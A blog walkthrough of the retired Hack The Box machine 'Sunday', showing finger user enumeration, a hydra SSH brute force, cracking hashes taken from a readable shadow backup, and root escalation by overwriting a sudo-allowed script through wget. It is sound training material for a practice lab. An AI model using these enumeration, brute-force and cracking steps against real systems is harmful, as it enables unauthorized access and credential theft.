---
layout: post
title: "HTB: SUNDAY (10.10.10.76)"
description: "Sunday is an easy box thats retired from Hack the box. I learned a tonn of stuff from this box, including enumerating users through Finger, brute forcing SSH, and exploiting sudo NOPASSWD. In beyond root I will look at the reset script and also log in to the web portal."
tags: [sunday, solaris, HTB, HackTheBox, finger-user-enum, finger, freeBSD, hydra, Bruteforcing, bash, unshadow, shadow, Hashcat, wget, troll]
image: "/assets/img/sunday/feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

```sh
# Nmap 7.93 scan initiated Sun Oct  1 08:59:18 2023 as: nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.76
Warning: 10.10.10.76 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.76
Host is up (0.38s latency).
Not shown: 61970 filtered tcp ports (no-response), 3560 closed tcp ports (reset)
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

# Nmap done at Sun Oct  1 09:01:02 2023 -- 1 IP address (1 host up) scanned in 104.45 seconds

# Nmap 7.93 scan initiated Sun Oct  1 09:02:37 2023 as: nmap -sC -sV -p79,111,515,6787,22022 -oA nmap/sunday 10.10.10.76
Nmap scan report for 10.10.10.76
Host is up (0.40s latency).

PORT      STATE SERVICE  VERSION
79/tcp    open  finger?
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
|_finger: No one logged on\x0D
111/tcp   open  rpcbind  2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
| http-title: Solaris Dashboard
|_Requested resource was https://10.10.10.76:6787/solaris/
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Not valid before: 2021-12-08T19:40:00
|_Not valid after:  2031-12-06T19:40:00
|_ssl-date: TLS randomness does not represent time
22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 aa0094321860a4933b87a4b6f802680e (RSA)
|_  256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.93%I=7%D=10/1%Time=65190B94%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SS
SF:LSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\
SF:x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20
SF:\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct  1 09:05:10 2023 -- 1 IP address (1 host up) scanned in 153.04 seconds
```

`nmap` identifies the host as `solaris` with `ssh` running on a non standard port.

### Port enumeration

#### Port 79 (finger)

Before this box i had not heard of the finger protocal. Some Googling made me understand:

Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are enumerating. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

#### User Enumeration

I will use `finger-user-enum` from [pentestmonkey](https://github.com/pentestmonkey/finger-user-enum).

```sh
┌─[george@parrot]─[~/HTB/boxes/sunday/finger-user-enum]
└──╼ $ ./finger-user-enum.pl -U /opt/Seclists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /opt/Seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Sun Oct  1 18:29:08 2023 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..

jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            console      <Oct 14, 2022>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???                         <Oct  1 14:41>..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Sun Oct  1 19:16:00 2023 #########
16 results.

10177 queries in 2812 seconds (3.6 queries / sec)
```
We see three possible users
- `root`
- `sammy`
- `sunny`

```sh
┌─[george@parrot]─[~/HTB/boxes/sunday/finger-user-enum]
└──╼ $ finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny           ???                         <Oct  1 14:41>
┌─[george@parrot]─[~/HTB/boxes/sunday/finger-user-enum]
└──╼ $ finger sammy@10.10.10.76
Login       Name               TTY         Idle    When    Where
sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         
┌─[george@parrot]─[~/HTB/boxes/sunday/finger-user-enum]
└──╼ $ finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14, 2022>
```

`root` seems to have a physical access to the box

## Shell as Sunny

I note the `sunny` user has had access to the box latest today unlike other users. I will take the username and try bruteforcing the password

Firing up `hydra` and using the password list `/opt/Seclists/Passwords/days.txt` since the box is named after a day of the week, I figured why not.

```sh
┌─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ hydra -l sunny -P /opt/Seclists/Passwords/days.txt ssh://10.10.10.76:22022
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 19:38:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 6240 login tries (l:1/p:6240), ~390 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[STATUS] 181.00 tries/min, 181 tries in 00:01h, 6064 to do in 00:34h, 16 active
[STATUS] 140.33 tries/min, 421 tries in 00:03h, 5824 to do in 00:42h, 16 active
[STATUS] 128.71 tries/min, 901 tries in 00:07h, 5344 to do in 00:42h, 16 active
[STATUS] 124.07 tries/min, 1861 tries in 00:15h, 4384 to do in 00:36h, 16 active
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-01 20:04:15
```
Luckily i got a hit. Password is `sunday` lol! I should have figured that out.

```sh
┌─[✗]─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ ssh -p 22022 sunny@10.10.10.76
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.
Password:
Warning: 10 failed authentication attempts since last successful authentication.  The latest at Sun Oct 01 17:05 2023.
Last login: Sun Oct  1 17:04:40 2023 from 10.10.16.7
Oracle Corporation      SunOS 5.11      11.4    Aug 2018
sunny@sunday:~$
```
## Shell as Sammy
### enumeration

Since we have a password I will check our `sudo` privileges.

```sh
sunny@sunday:~$ sudo -l
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

Not much help

Looking at the root folder I see a directory I dont normaly see `backup`

```sh
sunny@sunday:~$ ls /
backup    boot      dev       etc       home      lib       mnt       nfs4      platform  root      sbin      tmp       var
bin       cdrom     devices   export    kernel    media     net       opt       proc      rpool     system    usr       zvboot
```
Inside the `backup` folder, We have two files and we can read the `shadow.backup`.

This is a backup of the shadow file which is only readable by `root`

```sh
sunny@sunday:/backup$ ls -la
total 28
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Oct  1 05:39 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup

sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

### Password cracking

I will copy the shadow contents to my box, then I will copy the contents of `/etc/passwd` to my box too. Finally I will use `unshadow` to get hash of the user `sammy` and `sunny` and feed it to hashcat for cracking

```sh
┌─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ nano shadow.backup
┌─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ unshadow shadow.backup
Usage: unshadow PASSWORD-FILE SHADOW-FILE
┌─[✗]─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ nano passwd.txt
┌─[george@parrot]─[~/HTB/boxes/sunday]
└──╼ $ unshadow passwd.txt shadow.backup
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:/bin/sh
bin:x:2:2::/:/bin/sh
sys:x:3:3::/:/bin/sh
adm:x:4:4:Admin:/var/adm:/bin/sh
dladm:x:15:65:Datalink Admin:/:
netadm:x:16:65:Network Admin:/:
netcfg:x:17:65:Network Configuration Admin:/:
dhcpserv:x:18:65:DHCP Configuration Admin:/:
ftp:x:21:21:FTPD Reserved UID:/:
sshd:x:22:22:sshd privsep:/var/empty:/bin/false
smmsp:x:25:25:SendMail Message Submission Program:/:
aiuser:x:61:61:AI User:/:
ikeuser:x:67:12:IKE Admin:/:
lp:x:71:8:Line Printer Admin:/:/bin/sh
openldap:*LK*:75:75:OpenLDAP User:/:/usr/bin/pfbash
webservd:*LK*:80:80:WebServer Reserved UID:/:/bin/sh
unknown:x:96:96:Unknown Remote UID:/:/bin/sh
pkg5srv:x:97:97:pkg(7) server UID:/:
nobody:*LK*:60001:60001:NFS Anonymous Access User:/:/bin/sh
noaccess:*LK*:60002:65534:No Access User:/:/bin/sh
nobody4:*LK*:65534:65534:SunOS 4.x NFS Anonymous Access User:/:/bin/sh
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:100:10::/home/sammy:/usr/bin/bash
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:101:10::/home/sunny:/usr/bin/bash
```

We already know `sunny's` password, hence I will only concentrate on `sammy`

```sh
┌─[george@parrot]─[~/HTB/boxes/sunday]                                                                           
└──╼ $ hashcat -m 7400 pass.txt /usr/share/wordlists/rockyou.txt --username                                       
hashcat (v6.1.1) starting...
==========================snip===========

$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha256crypt $5$, SHA256 (Unix)
Hash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
Time.Started.....: Sun Oct  1 22:10:15 2023 (12 mins, 44 secs)
Time.Estimated...: Sun Oct  1 22:22:59 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      278 H/s (10.97ms) @ Accel:8 Loops:512 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 203552/14344385 (1.42%)
Rejected.........: 0/203552 (0.00%)
Restore.Point....: 203520/14344385 (1.42%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: coolster -> converge
```
And we are `sammy`

```sh
sunny@sunday:/backup$ su sammy
Password:
sammy@sunday:/backup$
```
## Shell as root
### enumeration

Looking at our `sudo` privileges we see we can `wget` as root without any password.

```sh
sammy@sunday:/backup$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

### Overwritting troll

Back on user sammy, we saw he can run a troll script but we did not know what to do with it. Now I think we need to rewrite it using `wget` and then execute it using user `sunny`.

Cool lets get going

I quickly realize this was a hard one to pull off since the troll script was reset to the default every few seconds hence you need to be fast.

Finally it Worked

![Privesc](/assets/img/sunday/privesc.png)

## Beyond root
### Troll Script
In beyond root I will look at what is resetting the troll script.

on the /root folder we have an `overwrite` script which is a bash script and does the resetting

```sh
root@sunday:~# ls
ls
overwrite
root.txt
troll
troll.original
root@sunday:~# cat troll
cat troll
#!/usr/bin/bash

/usr/bin/echo "testing"
/usr/bin/id


root@sunday:~# cat overwrite
cat overwrite
#!/usr/bin/bash

while true; do
        /usr/gnu/bin/cat /root/troll.original > /root/troll
        /usr/gnu/bin/sleep 5
done
```

### Http 6787

I will revist the web page to see whats on it as this is my first time am interacting with solaris.

I will use `sunny's` credentials to log in.

This is cool with all the different statistics.

![Solaris](/assets/img/sunday/solaris.png)

And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!

Happy hacking!
